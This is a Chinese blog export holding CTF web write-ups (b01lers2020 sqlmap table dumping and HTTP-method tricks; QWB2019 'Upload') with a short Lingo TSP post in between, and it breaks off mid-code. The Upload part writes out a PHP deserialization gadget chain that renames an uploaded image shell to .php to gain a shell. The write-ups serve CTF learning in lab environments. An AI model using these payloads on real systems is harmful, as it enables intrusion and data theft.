id="2-查表"><a href="#2-查表" class="headerlink" title="2.查表"></a>2.查表</h3><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;4f0ec106-cc04-4ba1-b28c-25a421ddfdd9.node3.buuoj.cn&#x2F;query?search&#x3D;amazonis_planitia -D alien_code --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/4.png" alt="测试结果-查tables"></p><p>查到了下面的这个<code>code</code>表。</p><h3 id="3-查字段"><a href="#3-查字段" class="headerlink" title="3.查字段"></a>3.查字段</h3><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;4f0ec106-cc04-4ba1-b28c-25a421ddfdd9.node3.buuoj.cn&#x2F;query?search&#x3D;amazonis_planitia -D alien_code -T code --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/5.png" alt="测试结果-查columns"><br>下面的<code>varchar</code>类型的<code>code</code>可疑，dump下来看一看。</p><h3 id="4-dump数据"><a href="#4-dump数据" class="headerlink" title="4.dump数据"></a>4.dump数据</h3><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;4f0ec106-cc04-4ba1-b28c-25a421ddfdd9.node3.buuoj.cn&#x2F;query?search&#x3D;amazonis_planitia -D alien_code -T code -C code --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/6.png" alt="测试结果-查数据值"></p><p>得flag:<code>flag&#123;a8bcd918-d4e5-4f92-b738-e726c6634d6e&#125;</code></p><blockquote><p>传统注入，自然是点到为止，到这里我们就赢了，就不测试手注了。</p></blockquote><p><strong>sqlmap这一把梭也太无脑了⑧，体现不出实力，算了，本来就是个菜鸡。</strong></p><h1 id="2-Space-Noodles"><a href="#2-Space-Noodles" class="headerlink" title="2.Space Noodles"></a>2.Space Noodles</h1><p>这里打开界面首先显示的是一个不能使用GET的页面，然后我们用BP抓包，将GET请求方式改为POST回显提示信息如下<br><pre class="line-numbers language-none"><code class="language-none">text ? pleas test teh follwing five roots,circle two I&#39;m am making an a pea eye and its grate PHP is the best printf(hello world) squaretwo :pleasequithelpwww.google. com&#x2F;seaerch how to exit vim&#x2F;quit :wqwhy isnt it working:wq:wq:wq:qw? <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>看到最后猜测可能是个vim源码泄露，下载文件<code>/.index.php.swp</code>~下载了个寂寞，啥都没有，看官方wp~</p><p><a href="https://ctftime.org/writeup/18801">官方wp</a></p><p>这里wp说他是要让我们是用各种http的请求方式来请求界面<code>/circle/one/</code>、<code>/square/</code>、<code>/two/</code>、<code>/com/seaerch/</code>、<code>/vim/quit</code>，会给出五个部分的flag，最终提交总的flag就ok了。<br>这里先列一下http的各个请求方式分别为<br><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/7.png" alt="HTTP的8种请求方法"></p><p>按他给的payload测试一下<br><pre class="line-numbers language-none"><code class="language-none">1. OPTIONS  &#x2F;circle&#x2F;one&#x2F;2. DELETE   &#x2F;square&#x2F;3. CONNECT  &#x2F;two&#x2F;4. GET      &#x2F;com&#x2F;seaerch&#x2F;5. TRACE    &#x2F;vim&#x2F;quit&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>自己挨个测的话也就测个几十次就也能测出来吧，或者根据下面的这种<code>curl</code>方式写个python脚本，我不太会写~其实就是不会写~<br><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/8.png" alt="curl之post"></p><p>那就老老实实测试呗，pycurl一点也不会用的这个样子，用curl测<br><strong>1</strong><br><pre class="line-numbers language-none"><code class="language-none">1.先curl -X OPTIONS http:&#x2F;&#x2F;166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn&#x2F;circle&#x2F;one&#x2F;报错:Warning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tell Warning: curl to output it to your terminal anyway, or consider &quot;--output Warning: &lt;FILE&gt;&quot; to save to a file.有个二进制文件输出，得添加--output选项输出文件，下面再次测试1.1.curl -X OPTIONS http:&#x2F;&#x2F;166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn&#x2F;circle&#x2F;one&#x2F; --output .&#x2F;1.txt成功下载文件到当前目录下，移到windows里面去打开，肯定不是txt文本文件，因为上面提示的似乎就是二进制文件，这里假装不知道是pdf文件，以txt文件的形式打开，第一行显示&#96;%PDF-1.3&#96;，猜测是pdf文件，改后缀名为.pdf后打开。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/9.png" alt><br>这算是得到了一部分flag<code>ketchup</code>?是的话那也太misc了吧。。。</p><blockquote><p>希望明白的师傅联系我QQ:2994016494</p></blockquote><p><strong>2</strong></p><pre class="line-numbers language-none"><code class="language-none">2.curl -X DELETE http:&#x2F;&#x2F;166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn&#x2F;square&#x2F; --output 2.txt   #还是文件，这里错的就不粘了。看文件头是个PNG文件，下面是图片内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/10.png" alt><br>我英语不好，如果比赛到这，~wtm直接放弃~。还是再看看后面的内容吧</p><p><strong>3</strong></p><pre class="line-numbers language-none"><code class="language-none">3.curl -X CONNECT http:&#x2F;&#x2F;166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn&#x2F;two&#x2F; --output 3.txtpng图片，下面就是图片内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/11.png" alt><br>这这这，瞧不起谁呢？我直接重拳出击<code>up_on_noodles</code></p><p><strong>4</strong></p><pre class="line-numbers language-none"><code class="language-none">3.curl -X GET http:&#x2F;&#x2F;166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn&#x2F;com&#x2F;seaerch&#x2F;这里报错&lt;提示&gt;&lt;htlm&gt;                                                                                                                                                                                                                                                                                  ,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:                                                                                                                                                                                                                                            ERROR &lt;&#x2F;&gt; search&#x3D;null&lt;&#x2F;end&gt;                                                                                                                                                                                                                                                           &lt;&#x2F;html&gt;需要传一个名为search的参数，这里传search&#x3D;flag,注意以GET方式传参哦。3.1.curl -X GET http:&#x2F;&#x2F;166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn&#x2F;com&#x2F;seaerch&#x2F;?search&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5</strong></p><pre class="line-numbers language-none"><code class="language-none">5.curl -X TRACE http:&#x2F;&#x2F;166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn&#x2F;vim&#x2F;quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>环境坏了，cao了，trace没开？一直回显<code>405 Not Allowed</code></p><p><strong>总结</strong></p><p>就温习了几种请求方式，好家伙，不是web-misc就是环境不能用，gg，下面是大佬的flag，不能无功而返啊也<br><code>flag&#123;ketchup_on_noodles_tastes_good_in_space_too&#125;</code>，，，，<code>必拿下</code><br>~注:疑似buu环境问题~，下面给出官方wp的解释，或许便于以后复现，不过这题除了web-misc也没啥难的了吧。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lingo解决TSP问题</title>
      <link href="2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98/"/>
      <url>2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h3><p>送货郎从一地址出发，途径各地，这里我们有每地到其他各地的距离，每地能且只能经过一次，最后回到出发点，求能走最短路程的路线？</p><h3 id="模型分析"><a href="#模型分析" class="headerlink" title="模型分析"></a>模型分析</h3><p>这里数学不好不做分析了，看书本上的分析，也就是对条件进行各种限制罢了。</p><p><strong>构成回路的分析稍显麻烦，这里直接引用了树上的内容</strong><br><img src="/2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98/0.png" alt="上"><br><img src="/2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98/1.png" alt="中"><br><img src="/2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98/2.png" alt="下"></p><h3 id="线性规划"><a href="#线性规划" class="headerlink" title="线性规划"></a>线性规划</h3><p><strong>这里的题目也是用到了lingo</strong></p><blockquote><p>这个真的就是最简单的线性规划问题了吧，我太菜了。</p></blockquote><p>lingo一般用来解决线性规划问题求出最优解（最大最小这个样子），在lingo中，这种求最大最小解的函数一般都是以<code>min=</code>或者<code>max=</code>什么开头的</p><blockquote><p>采用的应该是线性规划模型。<br><code>代码如下</code><br><pre class="line-numbers language-lingo" data-language="lingo"><code class="language-lingo">!TSP(Traveling Salesman Problem送货郎)问题;MODEL:SETS:city&#x2F;1..6&#x2F;:u;link(city,city):d,x;        ENDSETSDATA:d&#x3D;@FILE(F:\data1\data1.txt);     !导入距离矩阵，这里我放在了F盘的data1目录下，文件名为data1.txt;@text()&#x3D;@writefor(link(i,j)|x(i,j)#gt#0:&#39;x(&#39;,i,&#39;,&#39;,j,&#39;)&#x3D;&#39;,x(i,j));     !指定输出格式，输出为1的x;ENDDATAmin&#x3D;@sum(link:d*x);                                                            !最优解即路程的最小值@for(city(j):@sum(city(i)|j#ne#i:x(i,j))&#x3D;1);                                   !一列只有一个1;@for(city(i):@sum(city(j)|j#ne#i:x(i,j))&#x3D;1);                                   !一行只有一个1;@for(link(i,j)|i#ne#j#and#i#gt#1:u(i)-u(j)+6*x(i,j)&lt;&#x3D;5);                       !破圈;@for(link:@bin(x));                                                            !限制x取0或1;End<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p></blockquote><p>得到的结果为<br><pre class="line-numbers language-none"><code class="language-none">x(1,4)&#x3D;1 x(2,6)&#x3D;1 x(3,1)&#x3D;1 x(4,5)&#x3D;1 x(5,2)&#x3D;1 x(6,3)&#x3D;1  Model Class:                                      MILP所以路线可为(因数据较少可直接使用观察法[\滑稽])1-4-5-2-6-3-1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>此路线下可以使货郎走过的路程最短。</p><p>如图是运行结果，很快啊，就得到了结果。</p><p><img src="/2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98/3.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> Lingo </tag>
            
            <tag> 数学建模 </tag>
            
            <tag> tsp </tag>
            
            <tag> 线性规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2019</title>
      <link href="2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"/>
      <url>2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>阿巴阿巴阿巴阿巴。</p></blockquote><h1 id="1-Upload"><a href="#1-Upload" class="headerlink" title="1.Upload"></a>1.Upload</h1><p><strong>Tag:源码泄露，反序列化，getshell</strong></p><h2 id="1-源码泄露"><a href="#1-源码泄露" class="headerlink" title="1.源码泄露"></a>1.源码泄露</h2><p>用dirmap扫描目录后发现文件<code>/www.tar.gz</code>，下载一下<br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/1.png" alt></p><h2 id="2-分析源代码"><a href="#2-分析源代码" class="headerlink" title="2.分析源代码"></a>2.分析源代码</h2><p>源代码很多，看到有.idea就用phpstorm打开，然后就看到了有提示，~这提示，无处不在啊~，下面是截图<br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/2.png" alt><br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/3.png" alt><br>可以看到检查是否注册过的时候进行了反序列化操作，主要利用到的有两个文件，一个是<code>Register.php</code>文件，另一个文件是<code>Profile.php</code>。第一个文件是因为其析构方法，而第二个文件是我们主要要利用到的文件，在这里可以借用反序列化修改我们上传的图片(马)的后缀名从而<code>getshell</code>。</p><h2 id="3-构造payload"><a href="#3-构造payload" class="headerlink" title="3.构造payload"></a>3.构造payload</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>web<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Profile</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename_tmp</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$upload_menu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$img</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$except</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">except</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$registed</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">registed</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">except</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">'index'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">img</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"upload_img"</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ext</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"png"</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.png"</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.php"</span><span class="token punctuation">;</span><span class="token variable">$register</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$register</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">registed</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$register</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$register</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>payload构造:这里把except的键值对赋为<code>[&#39;index&#39; =&gt; &#39;img&#39;];</code>就能使访问<code>except[&#39;index&#39;] = &#39;img&#39;</code>，应该是这样。然后<code>img = upload_imp</code>，那最后就能调用到<code>upload_img</code>方法了。</p><p>然后就是下面的分析，这里创建register对象借助对象销毁时的析构函数，当<code>!register-&gt;registed==true</code>时，即<code>register-&gt;registed==false</code>时，执行<code>$this-&gt;checker-&gt;index();</code>，而如果把<code>$this-&gt;checker</code>赋为<code>$profile</code>那就能利用到上面的payload了，然后进入profile.php文件，首先是调用<code>index()</code>不存在的方法，调用到<code>__call()</code>魔术方法，然后调用<code>$this-&gt;index</code>不存在的变量，即调用<code>__get()</code>魔术方法，然后就能调用到<code>upload_img()</code>方法，然后就能该文件名了<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**register.php里面的析构函数*/</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">registed</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**profile.php里面的两个有用的魔术方法*/</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">except</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>这里的copy等操作的分析:前面的就不分析了，因为我们上传的本来就是图片马，这后面的反序列化的操作只是为了改掉我们上传的文件名使其能够成功被解析从而getshell。</p></blockquote><p>直接就下面的这个代码分析<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        @<span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">img</span><span class="token operator">=</span><span class="token double-quoted-string string">"../upload/<span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_menu</span></span>/<span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span></span>"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update_img</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Forbidden type!'</span><span class="token punctuation">,</span> <span class="token function">url</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'../index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unknow file type!'</span><span class="token punctuation">,</span> <span class="token function">url</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'../index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>其实没啥好分析的，目录和文件名都进行了md5加密<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment">#profile.php的构造函数里面进行了对目录的md5加密</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_menu</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment">#profile.php的upload_img()方法里面进行的对文件名的md5加密</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".png"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h2 id="3-5反序列化流程"><a href="#3-5反序列化流程" class="headerlink" title="3.5反序列化流程"></a>3.5反序列化流程</h2><pre class="line-numbers language-none"><code class="language-none">index.php触发反序列化。内容放在cookie中Register类的析构函数。访问$this-&gt;Profile类-&gt;index()函数index()函数不存在。触发call魔法函数。判断$this-&gt;index$this-&gt;index不存在。触发get魔法函数。访问$this-&gt;except[&#39;index&#39;]调用upload_img函数设置各个参数的变量。最后重命名图片<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://guokeya.github.io/post/VmI2NBAXh/">参考文章</a></p><h2 id="4-解题步骤"><a href="#4-解题步骤" class="headerlink" title="4.解题步骤"></a>4.解题步骤</h2><p>这里先构造图片马，上传好之后图片的地址为<br><code>http://bd69d605-98fb-4c65-ae78-787641fea86f.node3.buuoj.cn/upload/c41893938531041badacfc22febe3abd/00bf23e130fa1e525e332ff03dae345d.png</code><br>相对地址即为<code>/upload/c41893938531041badacfc22febe3abd/00bf23e130fa1e525e332ff03dae345d.png</code>，下面的payload就能放在本地环境里面获取了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>web<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Profile</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename_tmp</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$upload_menu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$img</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$except</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> 